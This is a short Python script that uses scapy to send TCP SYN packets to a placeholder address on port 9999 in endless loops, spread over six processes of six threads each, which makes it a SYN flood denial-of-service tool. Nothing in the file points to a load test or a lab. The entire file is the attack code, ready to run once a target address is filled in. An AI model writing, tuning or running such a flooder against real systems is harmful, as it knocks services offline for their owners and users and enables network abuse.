from scapy.all import Ether, IP, TCP, sendp
from multiprocessing import Process
import threading

dst_ip = "x.x.x.x"
iface_name = "Ethernet"

def send_loop():
    pkt = Ether() / IP(dst=dst_ip) / TCP(dport=9999, flags="S")
    while True:
        sendp(pkt, iface=iface_name, verbose=False)

def worker(thread_count=6):  # Tweak for performance (6 threads per process)
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=send_loop)
        t.daemon = True
        t.start()
        threads.append(t)
    # Keep the process alive
    for t in threads:
        t.join()

if __name__ == "__main__":
    process_count = 6  # Adjust to your number of CPU cores
    threads_per_process = 6  # Tweak for performance (6 threads per process)

    processes = []
    for _ in range(process_count):
        p = Process(target=worker, args=(threads_per_process,))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
